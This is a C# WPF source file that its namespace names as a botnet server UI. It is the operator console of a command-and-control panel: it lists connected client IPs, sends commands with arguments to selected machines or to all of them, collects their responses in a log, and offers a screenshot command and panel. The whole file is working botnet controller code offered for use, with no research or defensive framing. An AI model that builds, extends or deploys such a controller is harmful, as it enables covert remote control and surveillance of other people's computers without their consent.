// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using CommandsLibrary;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public bool ipsall;
        public string[] ips;
        TextBox[] args = new TextBox[0];
        public MainWindow()
        {
            InitializeComponent();
        }

        private async void Send_Command()
        {
            if (Command.Text == "")
            {
                MessageBox.Show("Постарайтесь ввести все значения правильно!");
                return;
            }
            try
            {
                string showcommand = Command.Text;
                string command = Command.Text;
                for (int i = 0; i < args.Length; i++)
                {
                    showcommand += " " + args[i].Text;
                    command += "^" + args[i].Text;
                }
                Message message = new Message()
                {
                    command = command,
                    ip = ipsall ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : ips
                };
                Uri res = await ApiRequest.CreateProductAsync(message, "messages");
                LogPanel.Text += $"Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages") - 1}) отправлена.\n";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Send_Command();
        }

        private void Command_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                Send_Command();
            }
        }

        private async void Formloaded(object sender, RoutedEventArgs e)
        {
            _ = await ApiRequest.DeleteProductsAsync("api/v1/messages");
            _ = await ApiRequest.DeleteProductsAsync("api/v1/responses");
            StartListenAsync();
        }
        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            StartListenAsync();
        }

        private async void StartListenAsync()
        {
            await Task.Run(() => ListenClients());
            await Task.Run(() => ListenResponses());
        }

        private async void ListenClients()
        {
            try
            {
                while (true)
                {
                    IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
                    if (arr == null)
                    {
                        continue;
                    }
                    string res = "";
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (arr[i].ip == "")
                        {
                            continue;
                        }
                        res += arr[i].ip + "\n";
                    }
                    await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
                    Thread.Sleep(7000);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private async void ListenResponses()
        {
            try
            {
                bool isFirstIter = true;
                List<uint> vars = new List<uint>();
                while (true)
                {
                    Responses[] responses = await ApiRequest.GetProductAsync<Responses[]>("api/v1/responses");
                    if (responses == null)
                    {
                        continue;
                    }
                    if (isFirstIter)
                    {
                        isFirstIter = false;
                        for (int i = 0; i < responses.Length; i++)
                        {
                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
                        }
                    }
                    if (vars.Count != responses.Length)
                    {
                        for (int i = vars.Count; i < responses.Length; i++)
                        {
                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
                        }
                    }
                    for (int i = 0; i < responses.Length; i++)
                    {
                        uint var1 = await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1;
                        if (var1 == vars[i])
                        {
                            Response response = await ApiRequest.GetProductAsync<Response>($"api/v1/responses/{responses[i].ip}/{var1}");
                            if (response != null)
                            {
                                await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += response.response + "\n"));
                            }
                            vars[i] = vars[i] + 1;
                        }
                    }
                    Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void IPSetButton_Click(object sender, RoutedEventArgs e)
        {
            IPSet iPSet = new IPSet();
            iPSet.Show();
        }
        private void Command_TextChanged(object sender, TextChangedEventArgs e)
        {
            for (int i = 0; i < Arguments.arguments.Length; i++)
            {
                if (Command.Text == Arguments.arguments[i].Command)
                {
                    if (Command.Text == "/screen")
                    {
                        Button button = new Button()
                        {
                            Content = "Открыть скриншот панель",
                            HorizontalAlignment = HorizontalAlignment.Stretch,
                            VerticalAlignment = VerticalAlignment.Bottom,
                            Margin = new Thickness(10, 10, 10, 18)
                        };
                        button.SetValue(Grid.ColumnProperty, 2);
                        button.SetValue(Grid.RowProperty, 2);
                        Grid.Children.Add(button);
                        button.Click += Button_Click1;
                    }
                    args = new TextBox[Arguments.arguments[i].ArgumentCount];
                    for (int j = 0, k = Arguments.arguments[i].ArgumentCount; j < Arguments.arguments[i].ArgumentCount; j++)
                    {
                        args[j] = new TextBox()
                        {
                            Name = $"Argument{j + 1}",
                            TextWrapping = TextWrapping.NoWrap,
                            HorizontalAlignment = HorizontalAlignment.Stretch,
                            Margin = new Thickness(10 + j * (270 / Arguments.arguments[i].ArgumentCount), 10, 10 + --k * (270 / Arguments.arguments[i].ArgumentCount), 18),
                        };
                        args[j].SetValue(Grid.ColumnProperty, 2);
                        args[j].SetValue(Grid.RowProperty, 2);
                        Grid.Children.Add(args[j]);
                        args[j].KeyDown += Command_KeyDown;
                    }
                    return;
                }
            }
            for (int i = 0; i < args.Length; i++)
            {
                Grid.Children.Remove(args[i]);
            }
        }

        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            Screens screenwindow = new Screens();
            screenwindow.Show();
        }
    }
}
